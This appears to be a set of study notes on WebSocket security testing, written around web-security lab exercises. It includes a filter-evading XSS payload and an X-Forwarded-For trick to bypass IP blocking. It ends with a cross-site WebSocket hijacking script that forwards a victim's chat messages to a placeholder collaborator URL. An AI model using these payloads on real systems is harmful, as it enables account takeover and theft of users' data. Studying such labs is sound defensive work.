# Websockets
WebSockets are widely used in modern web applications. They are initiated over HTTP and provide long-lived connections with asynchronous communication in both directions.
WebSockets are used for all kinds of purposes, including performing user actions and transmitting sensitive information. Virtually any web security vulnerability that arises with regular HTTP can also arise in relation to WebSockets communications.
## Manipulating WebSocket traffic
- Intercept and modify WebSocket messages.
- Replay and generate new WebSocket messages.
- Manipulate WebSocket connections.

- In Burp Client-Server connection checking
          - Client to Server: PING
          - Server to Client: PONG

- There are various situations in which manipulating the WebSocket handshake might be necessary:
    1. It can enable you to reach more attack surface.
    2.Some attacks might cause your connection to drop so you need to establish a new one.
    3.Tokens or other data in the original handshake request might be stale and need updating.




## WebSockets security vulnerabilities
- User-supplied input transmitted to the server might be processed in unsafe ways, leading to vulnerabilities such as SQL injection or XML external entity injection.
- Some blind vulnerabilities reached via WebSockets might only be detectable using out-of-band (OAST) techniques.
- If attacker-controlled data is transmitted via WebSockets to other application users, then it might lead to XSS or other client-side vulnerabilities.

## Manipulating WebSocket messages to exploit vulnerabilities
- If we sent <,>,/, browser automaticly HTML encode this chars, that is why we intercept request and put our XSS payloads 
```
{
"message":"Message"
}
```


## Manipulating the WebSocket handshake to exploit vulnerabilities (LAB)
- If your IP blacklisted for your attack add this headder
  ``` X-Forwarded-For: 1.1.1.1 ```
- Also change XXS payload to for not detecting by server.
  ``` <img src=1 oNeRrOr=alert`1`> ```

## Using cross-site WebSockets to exploit vulnerabilities (Cross-site WebSocket hijacking attack)
- Arises when the WebSocket handshake request relies only on HTTP cookies for session handling and does not contain any CSRF tokens.
- The attacker's page can then send arbitrary messages to the server via the connection and read the contents of messages that are received back from the server. This means that, unlike regular CSRF, the attacker gains two-way interaction with the compromised application.
- **IMPACT:** Perform unauthorized actions masquerading as the victim user, Retrieve sensitive data that the user can access.
- Example: Vulnerable handshake
            ```
          GET /chat HTTP/1.1
          Host: normal-website.com
          Sec-WebSocket-Version: 13
          Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
          Connection: keep-alive, Upgrade
          Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
          Upgrade: websocket
            ```
  - It is only rely on session cookie, `Sec-WebSocket-Key` contains a random value to prevent errors from caching proxies, not using for authentication.
  - **LAB EXPLOIT SCRIPT**. In lab there is not any CSRF token, and when user send "READY" message to WebSocket it response entire chat history. This script, Victim open WS , then send READY message, then send to us the messages
```
<script>
    var ws = new WebSocket('wss://your-websocket-url');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```
